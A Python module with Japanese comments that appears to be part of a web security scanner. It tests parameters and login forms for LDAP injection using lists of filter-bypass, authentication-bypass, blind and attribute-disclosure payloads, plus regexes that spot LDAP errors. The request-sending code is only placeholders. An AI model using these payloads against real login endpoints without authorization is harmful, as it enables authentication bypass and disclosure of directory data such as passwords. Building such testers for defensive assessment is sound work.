"""
LDAP Injection Tester - LDAPインジェクション検出

LDAP (Lightweight Directory Access Protocol) クエリに対する
インジェクション脆弱性を検出する非破壊的テスター。

⚠️ 注意: 検出のみ、ディレクトリ改変は行わない
"""

import logging
import re
from dataclasses import dataclass, field
from typing import List, Dict, Optional
from enum import Enum

logger = logging.getLogger(__name__)


class LDAPInjectionType(Enum):
    """LDAPインジェクションタイプ"""
    FILTER_BYPASS = "filter_bypass"       # フィルターバイパス
    AUTHENTICATION_BYPASS = "auth_bypass" # 認証バイパス
    BLIND = "blind"                       # ブラインドインジェクション
    ATTRIBUTE_DISCLOSURE = "attr_disclosure"  # 属性開示
    WILDCARD = "wildcard"                 # ワイルドカード攻撃


@dataclass
class LDAPInjectionResult:
    """LDAPインジェクション検出結果"""
    url: str
    parameter: str
    injection_type: LDAPInjectionType
    payload: str
    vulnerable: bool = False
    evidence: str = ""
    confidence: float = 0.0
    severity: str = "high"
    
    def to_dict(self) -> Dict:
        return {
            "url": self.url,
            "parameter": self.parameter,
            "type": self.injection_type.value,
            "payload": self.payload,
            "vulnerable": self.vulnerable,
            "confidence": self.confidence,
            "severity": self.severity,
        }


class LDAPInjectionTester:
    """
    LDAP Injection Tester
    
    機能:
    - フィルターバイパス検出
    - 認証バイパス検出
    - ブラインドインジェクション（エラーベース）
    - ワイルドカード攻撃検出
    
    ⚠️ 非破壊的ペイロードのみ使用（読み取りのみ）
    """
    
    # 基本フィルターバイパスペイロード
    FILTER_BYPASS_PAYLOADS = [
        # 括弧ベース
        ("*", "wildcard"),
        ("*)", "filter_bypass"),
        ("*)(objectClass=*)", "filter_bypass"),
        ("*)(&", "filter_bypass"),
        ("*))%00", "filter_bypass"),
        # 論理演算子
        ("*)(|(password=*)", "filter_bypass"),
        ("*)(|(&", "filter_bypass"),
        ("admin)(&", "filter_bypass"),
        # NULL バイト
        ("*\x00", "filter_bypass"),
        ("admin\x00", "filter_bypass"),
    ]
    
    # 認証バイパスペイロード
    AUTH_BYPASS_PAYLOADS = [
        # ユーザー名バイパス
        ("*", "auth_bypass"),
        ("admin*", "auth_bypass"),
        ("*)(uid=*))(|(uid=*", "auth_bypass"),
        ("admin)(&)", "auth_bypass"),
        # パスワードバイパス
        ("*)(&(password=*)", "auth_bypass"),
        ("*)(objectClass=*", "auth_bypass"),
        ("admin)(|(password=*)", "auth_bypass"),
    ]
    
    # ブラインドインジェクション用ペイロード
    BLIND_PAYLOADS = [
        # 真の条件
        ("*)(cn=*", "true_condition"),
        ("*)(objectClass=*", "true_condition"),
        # 偽の条件
        ("*)(cn=nonexistent12345", "false_condition"),
        ("invaliduser999", "false_condition"),
    ]
    
    # 属性開示ペイロード
    DISCLOSURE_PAYLOADS = [
        # 全属性列挙
        ("*)(*(objectClass=*)", "attr_disclosure"),
        ("*)((objectClass=*)", "attr_disclosure"),
        # 特定属性アクセス
        ("*)(userPassword=*", "attr_disclosure"),
        ("*)(mail=*", "attr_disclosure"),
    ]
    
    # LDAPエラーパターン
    LDAP_ERROR_PATTERNS = [
        r"LDAP\s*error",
        r"Invalid\s*LDAP",
        r"ldap_",
        r"javax\.naming",
        r"NamingException",
        r"LdapException",
        r"Bad\s*search\s*filter",
        r"Unbalanced\s*parenthesis",
        r"Invalid\s*filter",
        r"DSML",
        r"Active\s*Directory",
        r"OpenLDAP",
    ]
    
    def __init__(
        self,
        timeout: float = 10.0,
        delay: float = 0.5,
    ):
        """
        Args:
            timeout: HTTPタイムアウト（秒）
            delay: リクエスト間遅延（秒）
        """
        self.timeout = timeout
        self.delay = delay
        self.results: List[LDAPInjectionResult] = []
    
    def test(
        self,
        url: str,
        parameters: List[str],
        method: str = "GET",
        test_auth_bypass: bool = True,
    ) -> List[LDAPInjectionResult]:
        """
        LDAPインジェクションテスト
        
        Args:
            url: テスト対象URL
            parameters: テスト対象パラメータ
            method: HTTPメソッド
            test_auth_bypass: 認証バイパステストを含めるか
        
        Returns:
            検出結果リスト
        """
        results = []
        
        for param in parameters:
            # フィルターバイパステスト
            results.extend(self._test_filter_bypass(url, param, method))
            
            # 認証バイパステスト
            if test_auth_bypass:
                results.extend(self._test_auth_bypass(url, param, method))
            
            # ブラインドインジェクション
            results.extend(self._test_blind(url, param, method))
        
        self.results.extend(results)
        return results
    
    def _test_filter_bypass(
        self,
        url: str,
        parameter: str,
        method: str,
    ) -> List[LDAPInjectionResult]:
        """フィルターバイパステスト"""
        results = []
        
        for payload, _ in self.FILTER_BYPASS_PAYLOADS:
            result = self._test_payload(
                url=url,
                parameter=parameter,
                payload=payload,
                injection_type=LDAPInjectionType.FILTER_BYPASS,
                method=method,
            )
            if result:
                results.append(result)
        
        return results
    
    def _test_auth_bypass(
        self,
        url: str,
        parameter: str,
        method: str,
    ) -> List[LDAPInjectionResult]:
        """認証バイパステスト"""
        results = []
        
        for payload, _ in self.AUTH_BYPASS_PAYLOADS:
            result = self._test_payload(
                url=url,
                parameter=parameter,
                payload=payload,
                injection_type=LDAPInjectionType.AUTHENTICATION_BYPASS,
                method=method,
            )
            if result:
                results.append(result)
        
        return results
    
    def _test_blind(
        self,
        url: str,
        parameter: str,
        method: str,
    ) -> List[LDAPInjectionResult]:
        """ブラインドインジェクションテスト"""
        results = []
        true_responses = []
        false_responses = []
        
        for payload, condition in self.BLIND_PAYLOADS:
            result = self._test_payload(
                url=url,
                parameter=parameter,
                payload=payload,
                injection_type=LDAPInjectionType.BLIND,
                method=method,
            )
            
            if result:
                if condition == "true_condition":
                    true_responses.append(result)
                else:
                    false_responses.append(result)
        
        # 真偽で異なるレスポンスがあれば脆弱
        if true_responses and false_responses:
            # レスポンス差異判定（プレースホルダー）
            # 実際はレスポンス長や内容を比較
            pass
        
        return results
    
    def _test_payload(
        self,
        url: str,
        parameter: str,
        payload: str,
        injection_type: LDAPInjectionType,
        method: str,
    ) -> Optional[LDAPInjectionResult]:
        """
        単一ペイロードテスト（プレースホルダー）
        
        NOTE: 実際の実装ではrequestsでリクエスト送信
        """
        logger.info(
            "Testing LDAP injection: %s=%s on %s",
            parameter, payload[:30], url
        )
        
        result = LDAPInjectionResult(
            url=url,
            parameter=parameter,
            injection_type=injection_type,
            payload=payload,
        )
        
        # プレースホルダー実装
        # 実際:
        # 1. リクエスト送信
        # 2. エラーパターン検出
        # 3. 脆弱性判定
        
        return result
    
    def _analyze_response(
        self,
        response_text: str,
        original_response: str,
    ) -> tuple:
        """
        レスポンス分析
        
        Returns:
            (vulnerable: bool, confidence: float, evidence: str)
        """
        # LDAPエラーパターン検出
        for pattern in self.LDAP_ERROR_PATTERNS:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return (True, 0.9, match.group(0))
        
        # レスポンス差異（認証成功など）
        if "Welcome" in response_text and "Welcome" not in original_response:
            return (True, 0.8, "Authentication bypass detected")
        
        if "admin" in response_text.lower() and "admin" not in original_response.lower():
            return (True, 0.7, "Admin access detected")
        
        # レスポンス長差異
        len_diff = abs(len(response_text) - len(original_response))
        if len_diff > 500:
            return (True, 0.5, f"Response length diff: {len_diff}")
        
        return (False, 0.0, "")
    
    def test_authentication(
        self,
        url: str,
        username_param: str = "username",
        password_param: str = "password",
        valid_username: str = "admin",
    ) -> List[LDAPInjectionResult]:
        """
        認証フォーム専用テスト
        
        Args:
            url: ログインエンドポイント
            username_param: ユーザー名パラメータ
            password_param: パスワードパラメータ
            valid_username: テスト用ユーザー名
        
        Returns:
            検出結果リスト
        """
        results = []
        
        # 認証バイパスパターン
        bypass_combos = [
            # ユーザー名ワイルドカード
            ("*", "*"),
            # 既知ユーザー + パスワードバイパス
            (valid_username, "*"),
            # フィルター操作
            (f"{valid_username})(|(password=*", "*"),
            # NULL バイト
            (f"{valid_username}\x00", "*"),
            # 論理演算子
            (f"*)(uid=*))(|(uid=*", "anything"),
        ]
        
        for user_payload, pass_payload in bypass_combos:
            result = LDAPInjectionResult(
                url=url,
                parameter=f"{username_param}+{password_param}",
                injection_type=LDAPInjectionType.AUTHENTICATION_BYPASS,
                payload=f"user={user_payload}&pass={pass_payload}",
            )
            results.append(result)
        
        self.results.extend(results)
        return results
    
    def get_vulnerable(self) -> List[LDAPInjectionResult]:
        """脆弱と判定された結果のみ"""
        return [r for r in self.results if r.vulnerable]
    
    def get_summary(self) -> Dict:
        """サマリー"""
        vuln_count = len(self.get_vulnerable())
        by_type = {}
        
        for r in self.results:
            by_type[r.injection_type.value] = by_type.get(r.injection_type.value, 0) + (1 if r.vulnerable else 0)
        
        return {
            "total_tests": len(self.results),
            "vulnerable": vuln_count,
            "by_type": by_type,
        }
    
    def get_summary_for_ai(self) -> str:
        """AI向けサマリー"""
        summary = self.get_summary()
        return (
            f"LDAP Injection Test: {summary['total_tests']} tests\n"
            f"Vulnerable: {summary['vulnerable']}\n"
            f"By type: {summary['by_type']}"
        )


def create_ldap_tester(
    timeout: float = 10.0,
    delay: float = 0.5,
) -> LDAPInjectionTester:
    """LDAPInjectionTester作成ヘルパー"""
    return LDAPInjectionTester(timeout=timeout, delay=delay)
